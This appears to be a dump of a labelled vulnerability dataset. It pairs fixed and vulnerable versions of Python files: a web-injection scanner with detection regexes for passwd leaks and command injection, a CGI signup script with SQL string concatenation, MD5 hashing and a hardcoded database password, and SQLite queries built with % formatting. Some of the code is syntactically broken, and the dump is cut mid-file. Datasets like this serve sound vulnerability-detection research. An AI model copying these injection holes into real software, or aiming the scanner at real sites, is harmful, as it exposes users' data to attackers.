		html =  content.text

	#if post
	elif method == ""POST"":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text


	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		#generateExploit(parsedURL, method, paramname, payload)
		return True
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime(""%S-%f"")
	else:
		return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

	dirname = ""exploits/""
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy(""exploit.py"", dirname)

	f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
	f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	if attackType == sql_injection:
		
		falsePayload = sqli.get_false()[0]
		badhtml = """"
		#if get
		if method == ""GET"":
			getURL = url + ""?"" + paramname+""=""+falsePayload
			content = requests.get(getURL)
			badhtml =  content.text
		#if post
		elif method == ""POST"":
			content = requests.post(url, data={paramname:falsePayload})
			badhtml = content.text

		compare_res = sqli.compare_html(badhtml, html)		
		match = re.findall(r'<ins>.+', compare_res)
		if len(match) ==0 :
			return None
		return None

	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + ""/index.php"")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if ""GNU/Linux"" in html:
			return attackType

	return None;
	
def get_payloads(v=False):
	payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

	if v == True:
		for p in payloads:
			print p[0]

	return payloads


if __name__ == ""__main__"":
	get_payloads(v=True)

	## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = ""/commandinjection/commandinjection.php""
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, ""host"", 'POST', payload)

	#sqli
	# post in the form
	#url = ""/sqli/sqli.php""
	#payloads = sqli.get_all()
	#for payload in payloads:
	#	injectPayload(url, ""username"", ""POST"", payload)

	#Test for server side code injection
	# url = ""/serverside/eval2.php""
	# payloads = ssci.get_all(url)
	# for payload in payloads:
	# 	injectPayload(url, ""page"", ""POST"", payload)
	'''
	#test for open redirect
	url = ""/openredirect/openredirect.php""
	orPayload = oRedirect.get_all()
	for payload in orPayload:
	 	injectPayload(url, ""redirect"", ""GET"", payload)
	'''
/n/n/n/payloads/test_inject.py/n/nimport requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = """"

    #if get
    if method == ""GET"":
        getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == ""POST"":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime(""%S-%f"")
    else:
        return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

    dirname = ""exploits/""
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy(""exploit.py"", dirname)

    f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
    f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == ""GET"":
                getURL = url + ""?"" + paramname+""=""+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == ""POST"":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)

        if(content.status_code==200) and badhtml[1]==html:
            compare_res = sqli.compare_html(badhtml[0], html)  
            match = re.findall(r'<ins>.+', compare_res)

        else:
            match = """"
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + ""/index.php"")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if ""GNU/Linux"" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == ""__main__"":
    # get_payloads(v=True)

    payloads = get_payloads()
    url_list = ['/directorytraversal/directorytraversal.php',
                ""/commandinjection/commandinjection.php"",
                ""/sqli/sqli.php"",
                ""/serverside/eval2.php"",
                ""/openredirect/openredirect.php""]
    for payload in payloads:
        injectPayload(url_list[0], 'ascii', 'GET', payload)
        injectPayload(url_list[1], ""host"", 'POST', payload)
        injectPayload(url_list[2], ""username"", ""POST"", payload)
        injectPayload(url_list[3], ""page"", ""POST"", payload)
        injectPayload(url_list[4], ""redirect"", ""GET"", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = ""/commandinjection/commandinjection.php""
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, ""host"", 'POST', payload)

    #sqli
    # post in the form
    #url = ""/sqli/sqli.php""
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, ""username"", ""POST"", payload)

    #Test for server side code injection
    # url = ""/serverside/eval2.php""
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, ""page"", ""POST"", payload)
    '''
    #test for open redirect
    url = ""/openredirect/openredirect.php""
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, ""redirect"", ""GET"", payload)
    '''/n/n/n",1
62,62,bb6565986f52a8bb29c11d8aade74c42bbe3a4ca,"process_signup_validate.py/n/n#!/usr/bin/env python3
import re
import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie[""sessionID""] = urllib.parse.quote(Math.random())
    cookie[""username""] = urllib.parse.quote(username)
    cookie[""username""]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute(""SELECT Username FROM Users"")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are failed to signup correctly."");
                    alert(""Make sure you don't already have an account\nand that your passwords match."");
                </script>
                <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
	#Escape any < or > in the username or name
        username = re.escape(username)
	name = re.escape(name)	
        #add the user to the database
        cursor.execute(""INSERT INTO Users VALUES (""+username+"",""+ name+"",""+ hashedPassword"")"")

        #redirects to the message board
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are now signed in as ""+username);
                </script>
                <meta http-equiv=""refresh"" content=""0;url='messageboard.py'""/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print(""Content-Type: text/html"")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert(""You are failed to signup correctly."");
                alert(""Make sure you don't already have an account\nand that your passwords match."");
            </script>
            <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()
/n/n/n",0
63,63,bb6565986f52a8bb29c11d8aade74c42bbe3a4ca,"/process_signup_validate.py/n/n#!/usr/bin/env python3

import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie[""sessionID""] = urllib.parse.quote(Math.random())
    cookie[""username""] = urllib.parse.quote(username)
    cookie[""username""]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute(""SELECT Username FROM Users"")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are failed to signup correctly."");
                    alert(""Make sure you don't already have an account\nand that your passwords match."");
                </script>
                <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
        #add the user to the database
        cursor.execute(""INSERT INTO Users VALUES (""+username+"",""+ name+"",""+ hashedPassword"")"")

        #redirects to the message board
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are now signed in as ""+username);
                </script>
                <meta http-equiv=""refresh"" content=""0;url='messageboard.py'""/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print(""Content-Type: text/html"")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert(""You are failed to signup correctly."");
                alert(""Make sure you don't already have an account\nand that your passwords match."");
            </script>
            <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()
/n/n/n",1
64,64,59df39c8285aa4d6b7473163c3884e84d53604ce,"process_signup_validate.py/n/n#!/usr/bin/env python3
import re
import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie[""sessionID""] = urllib.parse.quote(Math.random())
    cookie[""username""] = urllib.parse.quote(username)
    cookie[""username""]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute(""SELECT Username FROM Users"")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are failed to signup correctly."");
                    alert(""Make sure you don't already have an account\nand that your passwords match."");
                </script>
                <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
	#Escape any < or > in the username or name
        username = re.escape(username)
	name = re.escape(name)	
        #add the user to the database
	query = ""INSERT INTO Users(username, name, password) values (%s, %s, %s)""
	cursor.execute(query,(username, name, hashedPassword)       


        #redirects to the message board
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are now signed in as ""+username);
                </script>
                <meta http-equiv=""refresh"" content=""0;url='messageboard.py'""/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print(""Content-Type: text/html"")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert(""You are failed to signup correctly."");
                alert(""Make sure you don't already have an account\nand that your passwords match."");
            </script>
            <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()
/n/n/n",0
65,65,59df39c8285aa4d6b7473163c3884e84d53604ce,"/process_signup_validate.py/n/n#!/usr/bin/env python3
import re
import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie[""sessionID""] = urllib.parse.quote(Math.random())
    cookie[""username""] = urllib.parse.quote(username)
    cookie[""username""]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute(""SELECT Username FROM Users"")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are failed to signup correctly."");
                    alert(""Make sure you don't already have an account\nand that your passwords match."");
                </script>
                <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
	#Escape any < or > in the username or name
        username = re.escape(username)
	name = re.escape(name)	
        #add the user to the database
        cursor.execute(""INSERT INTO Users VALUES (""+username+"",""+ name+"",""+ hashedPassword"")"")

        #redirects to the message board
        print(""Content-Type: text/html"")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert(""You are now signed in as ""+username);
                </script>
                <meta http-equiv=""refresh"" content=""0;url='messageboard.py'""/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print(""Content-Type: text/html"")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert(""You are failed to signup correctly."");
                alert(""Make sure you don't already have an account\nand that your passwords match."");
            </script>
            <meta http-equiv=""refresh"" content=""0;url='signup.html'""/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()
/n/n/n",1
60,60,c603201e401e414097358f32a23ca5521aa39dec,"brewdiedb.py/n/n# Copyright 2019, Lukas Jäger 
#
# This file is part of Brewdie.
#
# Brewdie is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# Brewdie is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Brewdie.  If not, see <http://www.gnu.org/licenses/>. 

import sqlite3
import sys
from recipe import *

class BrewdieDB:
    def __init__(self):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()

            # Querying for existing tables
            table_names = []
            for row in cursor.execute('SELECT name FROM sqlite_master WHERE type=\'table\''):
                table_names.append(row[0])

            # Creating tables if they don't exist
            if not 'Recipes' in table_names:
                cursor.execute('CREATE TABLE Recipes (name TEXT PRIMARY KEY, type TEXT, boiling_minutes INTEGER)')
            if not 'Malts' in table_names:
                cursor.execute('CREATE TABLE Malts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, gramms REAL, recipe_name TEXT)')
            if not 'Rests' in table_names:
                cursor.execute('CREATE TABLE Rests (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, degrees REAL, minutes INTEGER, position INTEGER, recipe_name TEXT)')
            if not 'HopDosages' in table_names:
                cursor.execute('CREATE TABLE HopDosages (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, minutes INTEGER, gramms REAL, recipe_name TEXT)')

            connection.commit()
        
        except sqlite3.Error as e:
            if connection:
                connection.rollback()
                sys.exit(1)

        finally:
            if connection:
                connection.close()

    def store_recipe(self, recipe):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Querying, whether or not the recipe is already in the database
            recipe_names = []
            for row in cursor.execute('SELECT name FROM Recipes'):
                recipe_names.append(row[0])
            if recipe.name in recipe_names:
                print(""Recipe is already stored in the database"")
            else:
                # It is not, so we can insert it
                cursor.execute('INSERT INTO Recipes VALUES(?, ?, ?)', (recipe.name, recipe.style, recipe.boiling_minutes))
                for (malt_name, malt_gramms) in recipe.malts.items():
                    cursor.execute('INSERT INTO Malts(name, gramms, recipe_name) VALUES(?, ?, ?)', (malt_name, malt_gramms, recipe.name))

                index = 0
                for rest in recipe.rests:
                    cursor.execute('INSERT INTO Rests(name, degrees, minutes, position, recipe_name) VALUES(?, ?, ?, ?, ?)', (rest.name, rest.degrees, rest.minutes, index, recipe.name))
                    index = index + 1

                for hop_dosage in recipe.hop_dosages:
                    cursor.execute('INSERT INTO HopDosages(name, minutes, gramms, recipe_name) VALUES(?, ?, ?, ?)', (hop_dosage.name, hop_dosage.minutes, hop_dosage.gramms, recipe.name))
            connection.commit()
        except sqlite3.Error as e:
            print(""Something went wrong"")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()

    def load_recipes(self):
        recipes = []
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Getting all the recipes
            for row in cursor.execute('SELECT * FROM Recipes'):
                # Converting a recipe database row into a python object
                recipe = Recipe(row[0], row[1], row[2])
                recipe_name = (recipe.name, )

                # Adding the malts
                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=?', recipe_name):
                    recipe.malts[malt_row[1]] = malt_row[2]

                # Adding the rests
                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=? ORDER BY position ASC', recipe_name):
                    recipe.rests.append(Rest(rest_row[1], rest_row[2], rest_row[3]))

                # Adding the hop dosages
                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=?', recipe_name):
                    recipe.hop_dosages.append(HopDosage(hop_dosage_row[1], hop_dosage_row[3], hop_dosage_row[2]))

                # Adding the recipe to the list of recipes
                recipes.append(recipe)

        except sqlite3.Error as e:
            print(""Something went wrong"")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()
        return recipes
/n/n/n",0
61,61,c603201e401e414097358f32a23ca5521aa39dec,"/brewdiedb.py/n/n# Copyright 2019, Lukas Jäger 
#
# This file is part of Brewdie.
#
# Brewdie is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# Brewdie is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Brewdie.  If not, see <http://www.gnu.org/licenses/>. 

import sqlite3
import sys
from recipe import *

class BrewdieDB:
    def __init__(self):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()

            # Querying for existing tables
            table_names = []
            for row in cursor.execute('SELECT name FROM sqlite_master WHERE type=\'table\''):
                table_names.append(row[0])

            # Creating tables if they don't exist
            if not 'Recipes' in table_names:
                cursor.execute('CREATE TABLE Recipes (name TEXT PRIMARY KEY, type TEXT, boiling_minutes INTEGER)')
            if not 'Malts' in table_names:
                cursor.execute('CREATE TABLE Malts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, gramms REAL, recipe_name TEXT)')
            if not 'Rests' in table_names:
                cursor.execute('CREATE TABLE Rests (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, degrees REAL, minutes INTEGER, position INTEGER, recipe_name TEXT)')
            if not 'HopDosages' in table_names:
                cursor.execute('CREATE TABLE HopDosages (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, minutes INTEGER, gramms REAL, recipe_name TEXT)')

            connection.commit()
        
        except sqlite3.Error as e:
            if connection:
                connection.rollback()
                sys.exit(1)

        finally:
            if connection:
                connection.close()

    def store_recipe(self, recipe):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Querying, whether or not the recipe is already in the database
            recipe_names = []
            for row in cursor.execute('SELECT name FROM Recipes'):
                recipe_names.append(row[0])
            if recipe.name in recipe_names:
                print(""Recipe is already stored in the database"")
            else:
                # It is not, so we can insert it
                cursor.execute('INSERT INTO Recipes VALUES(?, ?, ?)', (recipe.name, recipe.style, recipe.boiling_minutes))
                for (malt_name, malt_gramms) in recipe.malts.items():
                    cursor.execute('INSERT INTO Malts(name, gramms, recipe_name) VALUES(?, ?, ?)', (malt_name, malt_gramms, recipe.name))

                index = 0
                for rest in recipe.rests:
                    cursor.execute('INSERT INTO Rests(name, degrees, minutes, position, recipe_name) VALUES(?, ?, ?, ?, ?)', (rest.name, rest.degrees, rest.minutes, index, recipe.name))
                    index = index + 1

                for hop_dosage in recipe.hop_dosages:
                    cursor.execute('INSERT INTO HopDosages(name, minutes, gramms, recipe_name) VALUES(?, ?, ?, ?)', (hop_dosage.name, hop_dosage.minutes, hop_dosage.gramms, recipe.name))
            connection.commit()
        except sqlite3.Error as e:
            print(""Something went wrong"")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()

    def load_recipes(self):
        recipes = []
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Getting all the recipes
            for row in cursor.execute('SELECT * FROM Recipes'):
                # Converting a recipe database row into a python object
                recipe = Recipe(row[0], row[1], row[2])

                # Adding the malts
                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=\'%s\'' % recipe.name):
                    recipe.malts[malt_row[1]] = malt_row[2]

                # Adding the rests
                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=\'%s\' ORDER BY position ASC' % recipe.name):
                    recipe.rests.append(Rest(rest_row[1], rest_row[2], rest_row[3]))

                # Adding the hop dosages
                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=\'%s\'' % recipe.name):
                    recipe.hop_dosages.append(HopDosage(hop_dosage_row[1], hop_dosage_row[3], hop_dosage_row[2]))

                # Adding the recipe to the list of recipes
                recipes.append(recipe)

        except sqlite3.Error as e:
            print(""Something went wrong"")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()
        return recipes
/n/n/n",1
170,170,c66e035419698ea0d7a491f65f7e6fc31d9afb28,"lmfdb/zeros/first/firstzeros.py/n/nimport flask
from lmfdb.logger import make_logger
import os
from flask import render_template, request, url_for

FirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder=""templates"")
logger = make_logger(FirstZeros)

import sqlite3
data_location = os.path.expanduser(""~/data/zeros/"")
#print data_location


@FirstZeros.route(""/"")
def firstzeros():
    start = request.args.get('start', None, float)
    end = request.args.get('end', None, float)
    limit = request.args.get('limit', 100, int)
    degree = request.args.get('degree', None, int)
    # signature_r = request.arts.get(""signature_r"", None, int)
    # signature_c = request.arts.get(""signature_c"", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    # return render_template(""first_zeros.html"", start=start, end=end,
    # limit=limit, degree=degree, signature_r=signature_r,
    # signature_c=signature_c)
    title = ""Search for First Zeros of L-functions""
    bread=[(""L-functions"", url_for(""l_functions.l_function_top_page"")), (""First Zeros Search"", "" ""), ]
    return render_template(""first_zeros.html"",
                           start=start, end=end, limit=limit,
                           degree=degree, title=title, bread=bread)


@FirstZeros.route(""/list"")
def list_zeros(start=None,
               end=None,
               limit=None,
               fmt=None,
               download=None,
               degree=None):
               # signature_r = None,
               # signature_c = None):
    if start is None:
        start = request.args.get('start', None, float)
    if end is None:
        end = request.args.get('end', None, float)
    if limit is None:
        limit = request.args.get('limit', 100, int)
    if fmt is None:
        fmt = request.args.get('format', 'plain', str)
    if download is None:
        fmt = request.args.get('download', 'no')
    if degree is None:
        degree = request.args.get('degree', None, int)
    # if signature_r is None:
    #    signature_r = request.arts.get(""signature_r"", None, int)
    # if signature_c is None:
    #    signature_c = request.arts.get(""signature_c"", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    if start is None and end is None:
        end = 1000

    limit = int(limit)

    where_clause = 'WHERE 1=1 '

    values = []
    if end is not None:
        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line
        if('.' in str(end)):
            end = float(str(end)+'999')

    if start is None:
        end = float(end)
        where_clause += ' AND zero <= ?'
        values.append(end)
    elif end is None:
        start = float(start)
        where_clause += ' AND zero >= ?'
        values.append(start)
    else:
        start = float(start)
        end = float(end)
        where_clause += ' AND zero >= ? AND zero <= ?'
        values.extend([start, end])

    if degree is not None and degree != '':
        degree = int(degree)
        where_clause += ' AND degree = ?'
        values.append(degree)

    if end is None:
        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(
            where_clause, limit)
    else:
        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)

    #print query
    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()
    c.execute(query, values)

    response = flask.Response(("" "".join([str(x) for x in row]) + ""\n"" for row in c))
    response.headers['content-type'] = 'text/plain'
    if download == ""yes"":
        response.headers['content-disposition'] = 'attachment; filename=zetazeros'
    # response = flask.Response( (""1 %s\n"" % (str(row[0]),) for row in c) )
    return response
/n/n/n",0
171,171,c66e035419698ea0d7a491f65f7e6fc31d9afb28,"/lmfdb/zeros/first/firstzeros.py/n/nimport flask
from lmfdb.logger import make_logger
import os
from flask import render_template, request, url_for

FirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder=""templates"")
logger = make_logger(FirstZeros)

import sqlite3
data_location = os.path.expanduser(""~/data/zeros/"")
